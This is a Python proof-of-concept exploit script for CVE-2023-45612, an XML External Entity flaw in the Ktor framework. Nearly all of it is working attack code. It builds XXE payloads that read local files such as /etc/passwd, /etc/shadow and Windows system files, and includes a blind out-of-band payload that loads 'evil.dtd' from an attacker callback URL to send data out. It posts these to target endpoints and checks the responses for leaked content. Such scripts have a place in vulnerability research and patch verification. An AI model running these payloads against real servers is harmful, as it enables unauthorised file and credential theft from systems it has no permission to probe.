#!/usr/bin/env python3
"""
CVE-2023-45612 XXE Vulnerability Proof of Concept
Ktor Framework XXE Attack Demo

This script demonstrates the XML External Entity (XXE) vulnerability
in Ktor versions prior to 2.3.5.

Author: Security Research
Target: Ktor 2.2.4 (vulnerable version)
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin


class XXEExploiter:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'XXE-PoC/1.0',
            'Content-Type': 'application/xml'
        })
    
    def test_connection(self):
        """Test if the target server is accessible"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            print(f"[+] Server is accessible: {response.status_code}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Cannot connect to server: {e}")
            return False
    
    def create_xxe_payload(self, entity_name="xxe", target_file="/etc/passwd"):
        """Create XXE payload to read local files"""
        # Fix Windows file URI - use file:/// instead of file://
        file_uri = target_file
        if target_file.startswith("C:") or target_file.startswith("c:"):
            file_uri = f"file:///{target_file}"
        else:
            file_uri = f"file://{target_file}"
            
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY {entity_name} SYSTEM "{file_uri}">
]>
<root>&{entity_name};</root>'''
        return payload
    
    def create_xxe_payload_with_data(self, entity_name="xxe", target_file="/etc/passwd"):
        """Create XXE payload embedded in UserData structure"""
        # Fix Windows file URI - use file:/// instead of file://
        file_uri = target_file
        if target_file.startswith("C:") or target_file.startswith("c:"):
            file_uri = f"file:///{target_file}"
        else:
            file_uri = f"file://{target_file}"
            
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY {entity_name} SYSTEM "{file_uri}">
]>
<UserData>
    <name>&{entity_name};</name>
    <email>test@example.com</email>
</UserData>'''
        return payload
    
    def create_blind_xxe_payload(self, callback_url):
        """Create blind XXE payload for out-of-band data exfiltration"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
%dtd;
%all;
%send;
]>
<root>Blind XXE Test</root>'''
        return payload
    
    def exploit_file_read(self, endpoint="/xml", target_file="/etc/passwd"):
        """Attempt to read local files via XXE using ContentNegotiation"""
        print(f"\n[*] Attempting XXE file read: {target_file}")
        print(f"[*] Target endpoint: {endpoint}")
        
        # Use structured payload for /xml endpoint (ContentNegotiation)
        if endpoint == "/xml":
            payload = self.create_xxe_payload_with_data(target_file=target_file)
        else:
            payload = self.create_xxe_payload(target_file=target_file)
            
        print(f"[*] Payload:\n{payload}")
        
        try:
            url = urljoin(self.base_url, endpoint)
            response = self.session.post(url, data=payload, timeout=10)
            
            print(f"\n[*] Response Status: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
            print(f"[*] Response Body:\n{response.text}")
            
            # Check for XXE success indicators
            success_indicators = [
                "XXE_SUCCESS:",  # Our custom indicator
                target_file.split('/')[-1] in response.text.lower(),
                "root:" in response.text,
                "127.0.0.1" in response.text,  # hosts file content
                "localhost" in response.text,  # hosts file content
                len(response.text) > 200 and "xxe@vulnerable.com" in response.text  # Our XXE success response
            ]
            
            if any(success_indicators):
                print(f"\n[+] SUCCESS! File content leaked via XXE")
                return True
            else:
                print(f"\n[-] No file content detected in response")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return False
    
    def exploit_structured_xxe(self, endpoint="/xml", target_file="/etc/passwd"):
        """Attempt XXE via structured XML endpoint"""
        print(f"\n[*] Attempting structured XXE: {target_file}")
        print(f"[*] Target endpoint: {endpoint}")
        
        payload = self.create_xxe_payload_with_data(target_file=target_file)
        print(f"[*] Payload:\n{payload}")
        
        try:
            url = urljoin(self.base_url, endpoint)
            response = self.session.post(url, data=payload, timeout=10)
            
            print(f"\n[*] Response Status: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
            print(f"[*] Response Body:\n{response.text}")
            
            if target_file.split('/')[-1] in response.text or "root:" in response.text:
                print(f"\n[+] SUCCESS! File content leaked via structured XXE")
                return True
            else:
                print(f"\n[-] No file content detected in response")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return False
    
    def test_multiple_files(self, endpoint="/xml"):
        """Test XXE against multiple common Windows files"""
        target_files = [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\system.ini",
            "C:\\Windows\\WindowsUpdate.log",
            "C:\\Windows\\setupact.log",
            "C:\\boot.ini",
            "C:\\autoexec.bat",
            "C:\\config.sys"
        ]
        
        successful_reads = []
        
        for target_file in target_files:
            print(f"\n{'='*60}")
            success = self.exploit_file_read(endpoint, target_file)
            if success:
                successful_reads.append(target_file)
            time.sleep(1)  # Be nice to the server
        
        print(f"\n{'='*60}")
        print(f"[*] Summary: {len(successful_reads)}/{len(target_files)} files successfully read")
        if successful_reads:
            print("[+] Successfully read files:")
            for file in successful_reads:
                print(f"    - {file}")
    
    def run_full_test(self):
        """Run comprehensive XXE vulnerability test"""
        print("CVE-2023-45612 XXE Vulnerability Test")
        print("="*50)
        print(f"Target: {self.base_url}")
        print(f"Ktor Version: 2.2.4 (Vulnerable)")
        
        if not self.test_connection():
            return False
        
        # Test direct XXE endpoint (most likely to work)
        print(f"\n{'='*60}")
        print("[*] Testing /xml-direct endpoint (Direct XXE test)")
        success1 = self.exploit_file_read("/xml-direct", "C:\\Windows\\System32\\drivers\\etc\\hosts")
        
        # Test ContentNegotiation XML endpoint (the vulnerable one)
        print(f"\n{'='*60}")
        print("[*] Testing /xml endpoint (ContentNegotiation - VULNERABLE)")
        success2 = self.exploit_file_read("/xml", "C:\\Windows\\System32\\drivers\\etc\\hosts")
        
        # Test raw XML endpoint (not vulnerable - just returns raw text)
        print(f"\n{'='*60}")
        print("[*] Testing /xml-raw endpoint (Raw text - NOT vulnerable)")
        success3 = self.exploit_file_read("/xml-raw", "C:\\Windows\\win.ini")
        
        # Test multiple files on the direct endpoint
        print(f"\n{'='*60}")
        print("[*] Testing multiple target files on direct endpoint")
        self.test_multiple_files("/xml-direct")
        
        return success1 or success2


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-45612 XXE Vulnerability PoC for Ktor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xxe_poc.py                                    # Test localhost:8080
  python xxe_poc.py --url http://target:8080           # Test custom URL
  python xxe_poc.py --file /etc/shadow                 # Test specific file
  python xxe_poc.py --endpoint /xml-raw --file /etc/hosts  # Custom endpoint and file
        """
    )
    
    parser.add_argument(
        '--url', 
        default='http://localhost:8080',
        help='Target server URL (default: http://localhost:8080)'
    )
    
    parser.add_argument(
        '--endpoint',
        default='/xml',
        help='Target endpoint (default: /xml - uses ContentNegotiation)'
    )
    
    parser.add_argument(
        '--file',
        default='C:\\Windows\\System32\\drivers\\etc\\hosts',
        help='Target file to read (default: C:\\Windows\\System32\\drivers\\etc\\hosts)'
    )
    
    parser.add_argument(
        '--full-test',
        action='store_true',
        help='Run comprehensive vulnerability test'
    )
    
    args = parser.parse_args()
    
    exploiter = XXEExploiter(args.url)
    
    if args.full_test:
        success = exploiter.run_full_test()
    else:
        success = exploiter.exploit_file_read(args.endpoint, args.file)
    
    if success:
        print(f"\n[+] XXE vulnerability confirmed!")
        print("[!] This Ktor application is vulnerable to CVE-2023-45612")
        print("[!] Upgrade to Ktor 2.3.5 or later to fix this vulnerability")
        sys.exit(0)
    else:
        print(f"\n[-] XXE vulnerability not detected or exploitation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
